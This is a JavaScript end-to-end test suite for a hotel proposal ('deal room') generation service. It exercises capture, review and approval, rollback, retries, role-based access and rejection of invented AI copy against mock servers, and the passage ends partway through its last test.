// End-to-end tests: real headless capture of a mock hotel site, the real pipeline, the HTTP API, and a mock Hippo.
// Run: node --test test/e2e.test.js      (needs python3 + playwright + chromium)
"use strict";
const test = require("node:test");
const assert = require("node:assert/strict");
const { spawn } = require("node:child_process");
const http = require("node:http");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");

const ROOT = path.resolve(__dirname, "..");
const SITE_PORT = 8766, HIPPO_PORT = 8798, LLM_PORT = 8797, ROBOTS_PORT = 8767;
const SITE = `http://127.0.0.1:${SITE_PORT}/hotels/grand-azure/`;
const BLOCKED_SITE = `http://127.0.0.1:${ROBOTS_PORT}/hotels/blocked-hotel/`;
const HIPPO = `http://127.0.0.1:${HIPPO_PORT}`;
const DATA = fs.mkdtempSync(path.join(os.tmpdir(), "dra-test-"));

Object.assign(process.env, { DATA_DIR: DATA, API_KEYS: "tester:secret-key-123:admin,viewer1:viewer-key-1:viewer,op1:operator-key-1:operator", ALLOW_HTTP: "1", ALLOW_PRIVATE_HOSTS: "1", RETRY_BASE_MS: "50", RETRY_MAX_MS: "200", HIPPO_BASE_URL: HIPPO, HIPPO_API_TOKEN: "test-token", MAX_CONCURRENT: "2" });
delete process.env.LLM_BASE_URL;
const { createServer } = require("../src/server");
const { Jobs } = require("../src/jobs");

const children = [];
let api, base, llmServer, llmMode = "off";
const sleep = ms => new Promise(r => setTimeout(r, ms));
const H = { "x-api-key": "secret-key-123", "content-type": "application/json" };
const req = async (method, p, body, headers = H) => {
  const r = await fetch(base + p, { method, headers, body: body === undefined ? undefined : JSON.stringify(body) });
  const t = await r.text(); let j = null; try { j = JSON.parse(t); } catch {}
  return { status: r.status, json: j, text: t, headers: r.headers };
};
const waitFor = async (id, statuses, ms = 240000) => {
  const t0 = Date.now();
  for (;;) {
    const { json: j } = await req("GET", "/deal-rooms/" + id);
    if (statuses.includes(j.status)) return j;
    if (["failed", "succeeded", "cancelled", "rolled_back", "awaiting_approval"].includes(j.status) && !statuses.includes(j.status)) {
      const log = (await req("GET", `/deal-rooms/${id}/logs`)).text;
      assert.fail(`job ${id} ended as ${j.status} (${j.error}); wanted ${statuses}\n${log.slice(-3000)}`);
    }
    if (Date.now() - t0 > ms) assert.fail("timeout waiting for " + statuses);
    await sleep(300);
  }
};
const hippo = async (p, body) => (await fetch(HIPPO + p, body ? { method: "POST", body: JSON.stringify(body) } : {})).json();
const tokens = obj => [...new Set(JSON.stringify(obj).replace(/&amp;/g, "&").match(/\$\{[^}]*\}/g) || [])];

test.before(async () => {
  children.push(spawn("python3", ["-m", "http.server", String(SITE_PORT), "--bind", "127.0.0.1", "--directory", path.join(__dirname, "fixtures", "mocksite")], { stdio: "ignore" }));
  children.push(spawn("python3", ["-m", "http.server", String(ROBOTS_PORT), "--bind", "127.0.0.1", "--directory", path.join(__dirname, "fixtures", "robots_site")], { stdio: "ignore" }));
  children.push(spawn(process.execPath, [path.join(__dirname, "mock_hippo.js")], { env: { ...process.env, MOCK_HIPPO_PORT: String(HIPPO_PORT) }, stdio: "ignore" }));
  // mock OpenAI-compatible LLM: invents facts for the overview, stays grounded for dining
  llmServer = http.createServer((q, s) => { let b = ""; q.on("data", c => b += c); q.on("end", () => {
    const src = JSON.parse(b).messages[1].content;
    const text = /Sea Salt/.test(src) ? "Sea Salt restaurant serves Atlantic seafood, and Azul Bar sits on the rooftop." : "An award-winning resort with 900 rooms and a Michelin-starred restaurant in Porto.";
    s.writeHead(200, { "content-type": "application/json" }); s.end(JSON.stringify({ choices: [{ message: { content: text } }] }));
  }); }).listen(LLM_PORT, "127.0.0.1");
  const jobs = new Jobs({ dataDir: DATA, maxConcurrent: 2, recover: false });
  api = createServer(jobs); await new Promise(r => api.listen(0, "127.0.0.1", r));
  base = `http://127.0.0.1:${api.address().port}`;
  for (let i = 0; i < 50; i++) { try { await fetch(SITE); await fetch(HIPPO + "/__log"); await fetch(`http://127.0.0.1:${ROBOTS_PORT}/robots.txt`); break; } catch { await sleep(200); } }
  await hippo("/__reset", {});
});
test.after(() => { children.forEach(c => c.kill()); api && api.close(); llmServer && llmServer.close(); });

let scrape;   // captured once, reused by later tests (uploaded-scrape path)

test("health is public; everything else needs a valid key", async () => {
  assert.equal((await req("GET", "/health", undefined, {})).status, 200);
  assert.equal((await req("GET", "/deal-rooms", undefined, {})).status, 401);
  assert.equal((await req("GET", "/deal-rooms", undefined, { "x-api-key": "wrong" })).status, 401);
  assert.equal((await req("GET", "/deal-rooms", undefined, { authorization: "Bearer secret-key-123" })).status, 200);
});

test("bad input is rejected before a job starts", async () => {
  const r = await req("POST", "/deal-rooms", { hotel_url: "not a url", flow: "sms" });
  assert.equal(r.status, 400); assert.ok(r.json.details.length >= 2);
  assert.equal((await req("POST", "/deal-rooms", { hotel_url: SITE, load: "api" })).status, 400, "load=api without page id");
});

test("an OTA link fails at intake with a clear message", async () => {
  const { json } = await req("POST", "/deal-rooms", { hotel_url: "https://www.booking.com/hotel/pt/grand-azure.html" });
  const j = await waitFor(json.id, ["failed"]);
  assert.match(j.error, /intake: .*booking/);
});

let reviewJob;
test("review mode: capture → … → review, then waits for approval", async () => {
  const { status, json } = await req("POST", "/deal-rooms", { hotel_url: SITE, hippo_page_id: "1605252", load: "api" });
  assert.equal(status, 202);
  const j = await waitFor(json.id, ["awaiting_approval"]);
  reviewJob = j.id;
  for (const s of ["intake", "capture", "convert", "facts", "copy", "build", "review"]) assert.equal(j.stages[s].status, "ok", s);
  assert.equal(j.stages.load.status, "pending");
  const log = (await req("GET", `/deal-rooms/${j.id}/logs`)).text;
  assert.match(log, /cookie banner: clicked 'Accept all'/);
  const arts = (await req("GET", `/deal-rooms/${j.id}/artifacts`)).json.artifacts;
  for (const a of ["review.html", "template.json", "loader.js", "facts.json", "copy.json", "page.png"]) assert.ok(arts.includes(a), a);
  const facts = (await req("GET", `/deal-rooms/${j.id}/artifacts/facts.json`)).json;
  assert.ok(facts.every(f => f.verified), "every fact has a source");
  assert.ok(facts.some(f => f.field === "faq"), "FAQ answers read from structured data");
  const copy = (await req("GET", `/deal-rooms/${j.id}/artifacts/copy.json`)).json;
  assert.deepEqual(copy.ungrounded, {});
  assert.match(JSON.stringify(copy.fields.location_cards), /Belem Tower/);
  const tpl = (await req("GET", `/deal-rooms/${j.id}/artifacts/template.json`)).json;
  assert.deepEqual(Object.keys(tpl), ["multiple_logo_top", "sections", "sideNav", "header_cta_buttons", "settings", "contactInfo"]);
  assert.ok(!JSON.stringify(tpl).includes("response."), "no Cvent tokens in an Email deal room");
  assert.ok(tokens(tpl).length > 40);
  assert.equal(tpl.settings.primaryColor, "#0A3D62", "brand colour from the site header");
  const html = await (await fetch(`${base}/deal-rooms/${j.id}/artifacts/review.html`, { headers: H })).text();
  assert.match(html, /Grand Azure Resort Lisbon/);
  scrape = (await req("GET", `/deal-rooms/${j.id}/artifacts/scrape.json`)).json;
  assert.equal((await hippo("/__log")).length, 0, "nothing was sent to Hippo before approval");
});

test("artifacts are allowlisted", async () => {
  assert.equal((await req("GET", `/deal-rooms/${reviewJob}/artifacts/job.json`)).status, 404);
  assert.equal((await req("GET", `/deal-rooms/${reviewJob}/artifacts/..%2Fjob.json`)).status, 404);
  assert.equal((await req("GET", `/deal-rooms/dr_nope_00000000`)).status, 404);
  const r = await fetch(`${base}/deal-rooms/${reviewJob}/artifacts/loader.js`, { headers: H });
  assert.match(r.headers.get("content-disposition"), /attachment/);
});

test("unavailable preview images return 502 without stopping the server", async () => {
  const previewJobId = "dr_previewfailure_00000000";
  const previewJobDir = path.join(DATA, "jobs", previewJobId);
  fs.mkdirSync(previewJobDir, { recursive: true });
  fs.writeFileSync(path.join(previewJobDir, "job.json"), JSON.stringify({ id: previewJobId }));
  const configPath = path.join(previewJobDir, "config.json");
  fs.writeFileSync(configPath, JSON.stringify({ media: { preview_failure_test: { source_url: "https://8.8.8.8/not-an-image" } } }));
  const originalFetch = global.fetch;
  global.fetch = (input, options) => new URL(input).hostname === "8.8.8.8"
    ? Promise.resolve(new Response("not an image", { status: 200, headers: { "content-type": "text/html" } }))
    : originalFetch(input, options);
  try {
    const failed = await originalFetch(`${base}/deal-rooms/${previewJobId}/media/preview_failure_test`);
    assert.equal(failed.status, 502);
    assert.deepEqual(await failed.json(), { error: "preview image unavailable" });
    assert.equal((await originalFetch(`${base}/health`)).status, 200);
  } finally {
    global.fetch = originalFetch;
    fs.rmSync(previewJobDir, { recursive: true, force: true });
  }
});

test("overrides rebuild the deal room and keep it waiting for approval", async () => {
  const r = await req("POST", `/deal-rooms/${reviewJob}/overrides`, { dining_intro: "Sea Salt and Azul Bar, both with Atlantic views." });
  assert.equal(r.status, 202);
  const j = await waitFor(reviewJob, ["awaiting_approval"]);
  assert.equal(j.history.at(-1).event, "overrides");
  const tpl = (await req("GET", `/deal-rooms/${reviewJob}/artifacts/template.json`)).json;
  assert.match(JSON.stringify(tpl), /Sea Salt and Azul Bar, both with Atlantic views\./);
});

test("approve: backup, save the 6 editor keys, read back and verify", async () => {
  await hippo("/__reset", {});
  assert.equal((await req("POST", `/deal-rooms/${reviewJob}/approve`)).status, 202);
  const j = await waitFor(reviewJob, ["succeeded"]);
  assert.equal(j.stages.verify.status, "ok");
  const log = await hippo("/__log");
  assert.deepEqual(log.map(x => x.method), ["GET", "PATCH", "GET"]);
  assert.deepEqual(log[1].keys, ["multiple_logo_top", "sections", "sideNav", "header_cta_buttons", "settings", "contactInfo"]);
  assert.match(log[1].ctype, /x-www-form-urlencoded/);
  const page = await hippo("/__page/1605252");
  const tpl = (await req("GET", `/deal-rooms/${reviewJob}/artifacts/template.json`)).json;
  assert.deepEqual(page.sections.map(s => s.id), tpl.sections.map(s => s.id));
  const backup = (await req("GET", `/deal-rooms/${reviewJob}/artifacts/backup.json`)).json;
  assert.ok(backup.template.sections.length > 0);
  assert.equal((await req("POST", `/deal-rooms/${reviewJob}/approve`)).status, 409, "cannot approve twice");
});

test("rollback restores the page from the backup", async () => {
  const before = JSON.parse(fs.readFileSync(path.join(__dirname, "fixtures", "base_template.json"), "utf8"));
  assert.equal((await req("POST", `/deal-rooms/${reviewJob}/rollback`)).status, 202);
  await waitFor(reviewJob, ["rolled_back"]);
  const page = await hippo("/__page/1605252");
  assert.deepEqual(page.sections, before.sections);
});

test("a bad save is caught by verify and rolled back automatically", async () => {
  await hippo("/__reset", {}); await hippo("/__mode", { drop_section_on_save: true });
  const { json } = await req("POST", "/deal-rooms", { hotel_url: SITE, hippo_page_id: "1605252", load: "api", mode: "auto", scrape, customization: { asset_rights: { approved: true, note: "brand kit cleared" } } });
  const j = await waitFor(json.id, ["failed"]);
  await hippo("/__mode", {});
  assert.equal(j.stages.capture.status, "skipped");
  assert.match(j.error, /verify/); assert.equal(j.rolled_back, true);
  const before = JSON.parse(fs.readFileSync(path.join(__dirname, "fixtures", "base_template.json"), "utf8"));
  assert.deepEqual((await hippo("/__page/1605252")).sections, before.sections);
});

test("Cvent flow uses only Cvent merge fields (manual load gives a loader file)", async () => {
  const { json } = await req("POST", "/deal-rooms", { hotel_url: SITE, flow: "cvent", scrape });
  await waitFor(json.id, ["awaiting_approval"]);
  await req("POST", `/deal-rooms/${json.id}/approve`);
  const j = await waitFor(json.id, ["succeeded"]);
  assert.equal(j.stages.load.status, "ok");
  const tpl = (await req("GET", `/deal-rooms/${json.id}/artifacts/template.json`)).json;
  const t = tokens(tpl);
  assert.ok(t.length > 40 && t.every(x => /^\$\{(response\.|request\.|User\.)/.test(x)), "non-Cvent token: " + t.filter(x => !/^\$\{(response\.|request\.|User\.)/.test(x)));
  const loader = (await req("GET", `/deal-rooms/${json.id}/artifacts/loader.js`)).text;
  assert.match(loader, /response\.hotel_name/);
  assert.equal((await req("GET", `/deal-rooms/${json.id}/artifacts/verify.json`)).json.status, "skipped");
});

test("optional AI copy: invented facts are rejected, grounded rewrites are kept", async () => {
  process.env.LLM_BASE_URL = `http://127.0.0.1:${LLM_PORT}`;
  try {
    const { json } = await req("POST", "/deal-rooms", { hotel_url: SITE, scrape });
    await waitFor(json.id, ["awaiting_approval"]);
    const copy = (await req("GET", `/deal-rooms/${json.id}/artifacts/copy.json`)).json;
    assert.deepEqual(copy.ai_polished, ["dining_intro"]);
    const log = (await req("GET", `/deal-rooms/${json.id}/logs`)).text;
    assert.match(log, /AI rewrite of overview rejected .*(900|Michelin|Porto)/);
  } finally { delete process.env.LLM_BASE_URL; }
});

test("load=api without Hippo credentials fails safely at load", async () => {
  const saved = process.env.HIPPO_API_TOKEN; delete process.env.HIPPO_API_TOKEN;
  try {
    await hippo("/__reset", {});
    const { json } = await req("POST", "/deal-rooms", { hotel_url: SITE, hippo_page_id: "1605252", load: "api", mode: "auto", scrape });
    const j = await waitFor(json.id, ["failed", "awaiting_approval"]);
    if (j.status === "awaiting_approval") { await req("POST", `/deal-rooms/${json.id}/approve`); }
    const f = await waitFor(json.id, ["failed"]);
    assert.match(f.error, /load: .*HIPPO_API_TOKEN/);
    assert.equal((await hippo("/__log")).filter(x => x.method === "PATCH").length, 0);
  } finally { process.env.HIPPO_API_TOKEN = saved; }
});

test("a second load keeps the original backup, so rollback returns to the page before the agent", async () => {
  await hippo("/__reset", {});
  const before = JSON.parse(fs.readFileSync(path.join(__dirname, "fixtures", "base_template.json"), "utf8"));
  const { json } = await req("POST", "/deal-rooms", { hotel_url: SITE, hippo_page_id: "1562033", load: "api", scrape });
  await waitFor(json.id, ["awaiting_approval"]); await req("POST", `/deal-rooms/${json.id}/approve`); await waitFor(json.id, ["succeeded"]);
  await req("POST", `/deal-rooms/${json.id}/overrides`, { overview: "Second version of the overview for the Grand Azure Resort Lisbon." });
  await waitFor(json.id, ["awaiting_approval"]); await req("POST", `/deal-rooms/${json.id}/approve`); await waitFor(json.id, ["succeeded"]);
  assert.match(JSON.stringify(await hippo("/__page/1562033")), /Second version of the overview/);
  await req("POST", `/deal-rooms/${json.id}/rollback`); await waitFor(json.id, ["rolled_back"]);
  assert.deepEqual((await hippo("/__page/1562033")).sections, before.sections);
});

test("queued work resumes after a restart", async () => {
  const paused = new Jobs({ dataDir: DATA, maxConcurrent: 1, recover: false });
  paused.pump = () => {};                                          // simulate a server that dies before running anything
  const j = paused.create({ hotel_url: SITE, scrape }, "restart-test");
  assert.equal(paused.get(j.id).status, "queued");
  const fresh = new Jobs({ dataDir: DATA, maxConcurrent: 1 });     // recover() re-enqueues it
  const t0 = Date.now();
  while (!["awaiting_approval", "failed"].includes(fresh.get(j.id).status) && Date.now() - t0 < 120000) await sleep(300);
  assert.equal(fresh.get(j.id).status, "awaiting_approval");
});

test("cancel stops a queued or running job", async () => {
  const { json } = await req("POST", "/deal-rooms", { hotel_url: SITE });
  await sleep(300);
  assert.equal((await req("POST", `/deal-rooms/${json.id}/cancel`)).status, 200);
  await sleep(1500);
  assert.equal((await req("GET", "/deal-rooms/" + json.id)).json.status, "cancelled");
});


// =====================================================================================================================
// Hotel-specific automation: profile, customization, plan, QA, exceptions, retry, idempotency (PDF cases A-H)
// =====================================================================================================================
const keyH = k => ({ "x-api-key": k, "content-type": "application/json" });
const newJob = async (body, wanted = ["awaiting_approval"]) => {
  const r = await req("POST", "/deal-rooms", { hotel_url: SITE, scrape, ...body });
  assert.ok([200, 202].includes(r.status), `POST /deal-rooms -> ${r.status} ${r.text}`);
  return { id: r.json.id, r, job: await waitFor(r.json.id, wanted) };
};
const art = async (id, name) => (await req("GET", `/deal-rooms/${id}/artifacts/${name}`)).json;
const stripKeys = (o, keys) => { if (Array.isArray(o)) o.forEach(x => stripKeys(x, keys)); else if (o && typeof o === "object") for (const k of Object.keys(o)) { if (keys.includes(k)) delete o[k]; else stripKeys(o[k], keys); } return o; };
const sectionNames = tpl => tpl.sections.map(x => x.name);
let hotelId;

test("A. standard hotel: profile, plan, assets, mapping and QA artifacts, and an audit trail; review mode opens no exceptions", async () => {
  const { id, job } = await newJob({ opportunity_id: "OPP-A" });
  for (const st of ["profile", "plan", "assets", "build", "map", "qa", "review"]) assert.equal(job.stages[st].status, "ok", st);
  assert.equal(job.stages.publish_gate.status, "pending");
  const arts = (await req("GET", `/deal-rooms/${id}/artifacts`)).json.artifacts;
  for (const a of ["profile.json", "profile_validation.json", "customization.json", "plan.json", "assets.json", "mapping.json", "qa.json", "audit.jsonl"]) assert.ok(arts.includes(a), a);
  const profile = await art(id, "profile.json"), plan = await art(id, "plan.json"), qa = await art(id, "qa.json"), map = await art(id, "mapping.json"), assets = await art(id, "assets.json");
  hotelId = profile.hotel_id;
  assert.match(hotelId, /^grand-azure-[a-f0-9]{8}$/);
  assert.equal(profile.property_name, "Grand Azure Resort Lisbon");
  assert.ok(["draft", "approved"].includes(profile.profile_status));
  const prov = f => profile.evidence.find(e => e.field_key === f);
  assert.equal(prov("property_name").provenance, "officially_verified");
  assert.equal(prov("copy.location_cards").provenance, "inferred", "generated copy is never presented as verified");
  assert.ok(profile.evidence.every(e => "approval_status" in e && e.confidence_score > 0 && "extraction_method" in e && "source_url" in e));
  assert.deepEqual(plan.sections.map(x => x.key), ["overview", "fits", "rooms", "concessions", "meeting", "pricing", "dining", "amenities", "av", "location", "gallery", "pdf", "next_steps"]);
  assert.equal(plan.template_family, "standard");
  const bad = Object.values(assets.records).filter(r => !r.ok);
  assert.ok(bad.length >= 1 && Object.values(assets.records).some(r => r.ok && r.sha256 && r.width > 0), "photos are checked one by one; the unreachable CDN photo is flagged");
  const tpl = await art(id, "template.json");
  assert.ok(!JSON.stringify(tpl).includes("cdn.example.com"), "an unreachable photo never reaches the deal room");
  assert.equal(map.errors.length, 0);
  const cat = Object.fromEntries(map.dynamic.map(d => [d.token, d.category]));
  assert.equal(cat["${Guest Room Rate}"], "commercial"); assert.equal(cat["${Event Name}"], "event");
  assert.ok(map.static.some(x => x.target === "venues" && x.provenance === "officially_verified" && x.source_ref));
  assert.ok(["PASS", "REVIEW"].includes(qa.outcome) && qa.not_run.length === 3);
  assert.ok(qa.review.some(x => x.category === "USAGE_RIGHTS_UNCLEAR"), "brand-asset rights are not assumed");
  assert.equal(job.qa_outcome, qa.outcome);
  const result = await art(id, "result.json");
  assert.equal(result.delivery.status, "not_configured", "delivery is reported honestly, never as sent");
  const audit = (await req("GET", `/deal-rooms/${id}/audit`)).json.events.map(e => e.event);
  for (const e of ["job_created", "profile_saved", "plan_made", "assets_checked", "qa_outcome", "awaiting_approval"]) assert.ok(audit.includes(e), "audit: " + e);
  assert.equal((await req("GET", `/exceptions?job_id=${id}`)).json.exceptions.length, 0, "mode=review: the reviewer sees the items on the review page; the queue is for what automation cannot do");
  await req("POST", `/deal-rooms/${id}/cancel`);
});

test("B. premium family with an approved tour video", async () => {
  const { id } = await newJob({ opportunity_id: "OPP-B", customization: { template_family: "premium", include_tour_videos: true }, overrides: { featured_video: { hippo: { id: 77, title: "Property tour", token: "abc" } } } });
  const plan = await art(id, "plan.json"), tpl = await art(id, "template.json");
  assert.equal(plan.template_family, "premium");
  assert.deepEqual(sectionNames(tpl).slice(0, 3), ["Overview", "Virtual Tour & Gallery", "Why This Hotel Fits"]);
  assert.equal(plan.unmet_requests.length, 0);
  const gallery = tpl.sections[1];
  assert.ok(gallery.components.some(c => c.type === "OneColumn"), "the approved tour video is placed in the gallery");
  await req("POST", `/deal-rooms/${id}/cancel`);
});

test("C. event-focused proposal: meeting space leads, excluded section gone, CTAs and branding follow the customization", async () => {
  const { id } = await newJob({ opportunity_id: "OPP-C", customization: { focus: "event", exclude_sections: ["Concessions"], cta_buttons: ["schedule_site_visit", "download_pdf"], branding: { accent: "#B8860B" } } });
  const plan = await art(id, "plan.json"), tpl = await art(id, "template.json"), qa = await art(id, "qa.json");
  assert.equal(plan.template_family, "corporate_event");
  assert.deepEqual(sectionNames(tpl).slice(0, 3), ["Overview", "Why This Hotel Fits", "Meeting Space"]);
  assert.ok(!sectionNames(tpl).includes("Concessions & Value Adds") && plan.omitted[0].code === "EXCLUDED");
  assert.deepEqual(tpl.header_cta_buttons.map(b => b.text), ["<b>Schedule Site Visit</b>", "<b>Download Proposal PDF</b>"]);
  assert.equal((await art(id, "report.json")).palette.accent, "#B8860B");
  assert.ok(!qa.critical.length);
  assert.equal(JSON.stringify(plan.decisions).includes("focus 'event'"), true, "the plan explains itself");
  await req("POST", `/deal-rooms/${id}/cancel`);
});

test("customization is validated before a job starts", async () => {
  for (const [c, msg] of [[{ focus: "party" }, /focus/], [{ preferred_sections: ["Spa Day"] }, /Spa Day/], [{ exclude_sections: ["overview"] }, /Overview/], [{ branding: { primary: "red" } }, /RRGGBB/], [{ nope: 1 }, /unsupported/]]) {
    const r = await req("POST", "/deal-rooms", { hotel_url: SITE, scrape, customization: c });
    assert.equal(r.status, 400, JSON.stringify(c)); assert.match(JSON.stringify(r.json.details), msg);
  }
});

test("D. missing required information: generation is blocked and the exception names the fields; a correction resumes it", async () => {
  const noAddr = stripKeys(structuredClone(scrape), ["address"]);
  const { id, job } = await newJob({ opportunity_id: "OPP-D", scrape: noAddr }, ["failed"]);
  assert.equal(job.failed_stage, "profile");
  assert.ok(!(await req("GET", `/deal-rooms/${id}/artifacts`)).json.artifacts.includes("template.json"), "nothing was generated");
  const { exceptions } = (await req("GET", `/exceptions?job_id=${id}&status=open`)).json;
  assert.equal(exceptions.length, 1);
  const x = exceptions[0];
  assert.equal(x.category, "REQUIRED_INFO_MISSING"); assert.equal(x.failed_stage, "profile"); assert.equal(x.severity, "critical");
  assert.ok(x.missing_fields.includes("address") && x.missing_fields.includes("city"));
  for (const f of ["exception_id", "hotel_id", "hotel_url", "opportunity_id", "job_id", "error_code", "description", "source_references", "retry_eligible", "assigned_reviewer", "resolution_notes", "resolution_status", "created_at", "updated_at"]) assert.ok(f in x, f);
  assert.equal(x.opportunity_id, "OPP-D");
  assert.equal((await req("POST", `/exceptions/${x.exception_id}/assign`, { reviewer: "dana" })).json.resolution_status, "in_review");
  assert.equal((await req("POST", `/exceptions/${x.exception_id}/assign`, { reviewer: "" })).status, 400);
  const prof = await art(id, "profile_validation.json");
  assert.equal(prof.ok, false); assert.equal(prof.levels["1"], "fail");
  // the reviewer fixes the one problem; the job resumes without anybody rebuilding it
  assert.equal((await req("POST", `/deal-rooms/${id}/overrides`, { address: "Avenida Marginal 100, Lisbon", location_tag: "Lisbon" })).status, 202);
  const fixed = await waitFor(id, ["awaiting_approval"]);
  assert.equal(fixed.stages.profile.status, "ok");
  const after = (await req("GET", `/exceptions/${x.exception_id}`)).json;
  assert.equal(after.resolution_status, "resolved"); assert.match(after.resolution_notes, /passed/);
  const fixedProfile = await art(id, "profile.json");
  assert.ok(fixedProfile.evidence.some(e => e.field_key === "address" && e.provenance === "manually_corrected"), "the correction is recorded as manually corrected");
  assert.equal(fixedProfile.profile_status, "draft", "new content is a draft until a person approves it");
  assert.ok(fixedProfile.evidence.every(e => e.approval_status === "pending"));
  assert.equal((await req("POST", `/exceptions/${x.exception_id}/resolve`, { notes: "again" })).status, 409, "already closed");
  await req("POST", `/deal-rooms/${id}/cancel`);
});

test("E. broken images: unusable photos are dropped; when none is usable, publication is blocked and the exception says why", async () => {
  await hippo("/__reset", {});
  const broken = stripKeys(structuredClone(scrape), ["image"]);
  broken.images = broken.images.map((im, i) => ({ ...im, url: `http://127.0.0.1:${SITE_PORT}/img/gone-${i}.jpg` }));
  const { id, job } = await newJob({ opportunity_id: "OPP-E", scrape: broken }, ["failed"]);
  assert.equal(job.failed_stage, "assets"); assert.equal(job.stages.assets.error.code, "ASSETS_UNAVAILABLE");
  assert.equal(job.stages.assets.attempts, 1, "a 404 is permanent: not retried");
  const x = (await req("GET", `/exceptions?job_id=${id}`)).json.exceptions[0];
  assert.equal(x.category, "ASSET_MISSING"); assert.match(x.description, /could be verified/);
  assert.ok(!(await req("GET", `/deal-rooms/${id}/artifacts`)).json.artifacts.includes("template.json"));
  assert.equal((await hippo("/__log")).filter(l => l.method === "PATCH").length, 0, "nothing reached Hippo");
});

test("F/G. transient Hippo failures retry with backoff; an exhausted load keeps the valid proposal and resumes at load, without duplicates", async () => {
  await hippo("/__reset", {});
  const a = await newJob({ opportunity_id: "OPP-F1", hippo_page_id: "1605252", load: "api" });
  await hippo("/__mode", { fail_next: 2 });
  assert.equal((await req("POST", `/deal-rooms/${a.id}/approve`)).status, 202);
  const done = await waitFor(a.id, ["succeeded"]);
  assert.equal(done.stages.load.attempts, 3, "two 503s, then success");
  const log = await hippo("/__log");
  assert.equal(log.filter(l => l.status === 503).length, 2); assert.equal(log.filter(l => l.method === "PATCH" && !l.status).length, 1, "the page was written once");
  const events = (await req("GET", `/deal-rooms/${a.id}/audit`)).json.events;
  assert.equal(events.filter(e => e.event === "retry_scheduled").length, 2);
  assert.equal(events.find(e => e.event === "retry_scheduled").stage, "load");
  assert.equal((await req("GET", `/exceptions?job_id=${a.id}`)).json.exceptions.length, 0, "a recovered transient failure is not an exception");

  await hippo("/__reset", {});
  const b = await newJob({ opportunity_id: "OPP-F2", hippo_page_id: "1562033", load: "api" });
  await hippo("/__mode", { fail_next: 99 });
  await req("POST", `/deal-rooms/${b.id}/approve`);
  const failed = await waitFor(b.id, ["failed"]);
  assert.equal(failed.failed_stage, "load"); assert.equal(failed.stages.load.attempts, 3); assert.equal(failed.stages.load.error.code, "HIPPO_TRANSIENT");
  assert.equal(failed.stages.build.status, "ok", "the generated proposal is kept");
  const x = (await req("GET", `/exceptions?job_id=${b.id}`)).json.exceptions[0];
  assert.equal(x.category, "PUBLISH_FAILURE"); assert.equal(x.retry_eligible, true); assert.match(x.description, /after 3 attempts/);
  await hippo("/__mode", {});                                   // the cause is fixed first, then the person retries
  assert.equal((await req("POST", `/deal-rooms/${b.id}/retry`)).status, 202);
  const ok = await waitFor(b.id, ["succeeded"]);
  assert.equal(ok.stages.build.started_at, failed.stages.build.started_at, "build was not run again");
  assert.equal(ok.retries, 1);
  assert.equal((await req("GET", `/exceptions/${x.exception_id}`)).json.resolution_status, "resolved");
  assert.equal((await hippo("/__log")).filter(l => l.method === "PATCH" && !l.status).length, 1, "one write, no duplicate proposal");
  assert.equal((await req("POST", `/deal-rooms/${b.id}/retry`)).status, 409, "only a failed job can be retried");
});

test("H. identical requests do not create duplicate jobs; force, idempotency keys and the page lock behave", async () => {
  const body = { hotel_url: SITE, scrape, opportunity_id: "OPP-H" };
  const first = await req("POST", "/deal-rooms", body); assert.equal(first.status, 202);
  const again = await req("POST", "/deal-rooms", body);
  assert.equal(again.status, 200); assert.equal(again.json.deduplicated, true); assert.equal(again.json.id, first.json.id);
  const withTracking = await req("POST", "/deal-rooms", { ...body, hotel_url: SITE + "?utm_source=email&gclid=abc" });
  assert.equal(withTracking.json.id, first.json.id, "tracking parameters do not make a different request");
  const other = await req("POST", "/deal-rooms", { ...body, customization: { focus: "event" } });
  assert.equal(other.status, 202); assert.notEqual(other.json.id, first.json.id);
  const forced = await req("POST", "/deal-rooms", { ...body, force: true });
  assert.equal(forced.status, 202); assert.notEqual(forced.json.id, first.json.id);
  // client idempotency key
  const k1 = await fetch(base + "/deal-rooms", { method: "POST", headers: { ...H, "idempotency-key": "req-123" }, body: JSON.stringify({ ...body, opportunity_id: "OPP-H2" }) });
  const k1j = await k1.json(); assert.equal(k1.status, 202);
  const k2 = await fetch(base + "/deal-rooms", { method: "POST", headers: { ...H, "idempotency-key": "req-123" }, body: JSON.stringify({ ...body, opportunity_id: "OPP-H2" }) });
  assert.equal((await k2.json()).id, k1j.id); assert.equal(k2.status, 200);
  const k3 = await fetch(base + "/deal-rooms", { method: "POST", headers: { ...H, "idempotency-key": "req-123" }, body: JSON.stringify({ ...body, opportunity_id: "OPP-OTHER" }) });
  assert.equal(k3.status, 422, "same key, different request");
  // one job per Hippo page at a time
  const lock = await req("POST", "/deal-rooms", { hotel_url: SITE, scrape, opportunity_id: "OPP-H3", hippo_page_id: "9999999", load: "api" }); assert.equal(lock.status, 202);
  const clash = await req("POST", "/deal-rooms", { hotel_url: SITE, scrape, opportunity_id: "OPP-H4", hippo_page_id: "9999999", load: "api" });
  assert.equal(clash.status, 409); assert.equal(clash.json.conflicting_job, lock.json.id);
  await req("POST", `/deal-rooms/${lock.json.id}/cancel`);
  const free = await req("POST", "/deal-rooms", { hotel_url: SITE, scrape, opportunity_id: "OPP-H4", hippo_page_id: "9999999", load: "api" });
  assert.equal(free.status, 202, "the page is free once the other job is cancelled");
  for (const j of [first, other, forced, k1j, free.json]) await req("POST", `/deal-rooms/${j.id}/cancel`);
  assert.equal((await req("GET", "/metrics")).json.since_start.duplicate_requests_deduplicated >= 3, true);
});

test("roles: viewers read, operators operate, only admins approve brand-asset rights", async () => {
  const viewer = keyH("viewer-key-1"), operator = keyH("operator-key-1");
  assert.equal((await req("GET", "/deal-rooms", undefined, viewer)).status, 200);
  assert.equal((await req("POST", "/deal-rooms", { hotel_url: SITE, scrape, opportunity_id: "OPP-R1" }, viewer)).status, 403);
  assert.equal((await req("GET", "/exceptions", undefined, viewer)).status, 200);
  const r = await req("POST", "/deal-rooms", { hotel_url: SITE, scrape, opportunity_id: "OPP-R2", customization: { asset_rights: { approved: true } } }, operator);
  assert.equal(r.status, 403); assert.match(r.json.error, /admin/);
  const ok = await req("POST", "/deal-rooms", { hotel_url: SITE, scrape, opportunity_id: "OPP-R3", customization: { focus: "event" } }, operator);
  assert.equal(ok.status, 202, "operators can still do everything they could before roles existed");
  await req("POST", `/deal-rooms/${ok.json.id}/cancel`);
  assert.equal((await req("GET", "/deal-rooms", undefined, keyH("nope"))).status, 401);
});

test("mode=auto that cannot proceed safely opens an exception; approving it closes the exception", async () => {
  const { id, job } = await newJob({ opportunity_id: "OPP-X", mode: "auto" });
